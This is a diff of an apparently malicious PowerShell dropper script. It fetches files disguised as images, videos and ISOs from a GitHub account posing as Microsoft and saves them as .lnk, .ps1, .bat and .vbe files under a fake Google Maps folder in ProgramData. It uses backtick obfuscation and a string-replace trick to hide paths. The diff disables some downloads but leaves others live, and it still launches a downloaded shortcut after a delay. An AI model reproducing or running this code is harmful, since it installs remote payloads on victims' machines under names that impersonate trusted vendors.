@@ -102,18 +102,18 @@ else{
 
 start-sleep -s 3
 
- $defender = 'C:\Prog^^^^^^^^^^^^^^^^^^le\Maps\'.Replace("^^^^^^^^^^^^^^^^^^","ramData\Goog")
+
  
 
  
  powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/settings/defender.iso', 'C:\ProgramData\Google\Maps\Defender.lnk') }"
  start-sleep -s 3
- powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/settings/wish.iso', 'C:\ProgramData\Google\Maps\Wish.lnk') }"
+ #  powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/settings/wish.iso', 'C:\ProgramData\Google\Maps\Wish.lnk') }"
   start-sleep -s 3
   
   powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/settings/maps.iso', 'C:\ProgramData\Google\Maps\Microsoft Arts\Start\Maps.lnk') }"
    start-sleep -s 3
- powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/settings/defender.mp4', 'C:\ProgramData\Google\Maps\Wish.ps1') }"
+  # powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/settings/defender.mp4', 'C:\ProgramData\Google\Maps\Wish.ps1') }"
 
 start-sleep -s 3
 
@@ -122,7 +122,7 @@ powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.gi
 
  
  start-sleep -s 3
- powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/settings/wish.png', 'C:\ProgramData\Google\Maps\Wish.bat') }"
+  # powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/settings/wish.png', 'C:\ProgramData\Google\Maps\Wish.bat') }"
 
 
  start-sleep -s 3
@@ -133,25 +133,16 @@ powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.gi
 
 
 
-if((New-Object "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`F`i`l`e"('https://raw.githubusercontent.com/microsoft-services/staff/settings/all.wmv', $defender + 'AddUsers.ps1')){
-}
 
- $def = 'C:\Prog^^^^^^^^^^^^^^^^^^le\Maps\'.Replace("^^^^^^^^^^^^^^^^^^","ramData\Goog")
 
+ 
 
 
 
+ # start-sleep -s 9
 
-if((New-Object "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`F`i`l`e"('https://raw.githubusercontent.com/microsoft-services/staff/settings/ss.png', $def + 'Google.vbe')){
-}
-
-
-
-
-start-sleep -s 9
-# start "C:\ProgramData\Google\Maps\Google.vbe"
- Start "C:\ProgramData\Google\Maps\Wish.lnk"
-start-sleep -s 9
+ # Start "C:\ProgramData\Google\Maps\Wish.lnk"
+ # start-sleep -s 9
 
  powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/settings/uno.png', 'C:\ProgramData\Google\Maps\Maps.ps1') }"
 
@@ -162,7 +153,7 @@ start-sleep -s 3
 
 
 
-start-sleep -s 9
+start-sleep -s 60
  Start "C:\ProgramData\Google\Maps\Microsoft Arts\Start\Maps.lnk"
 
 
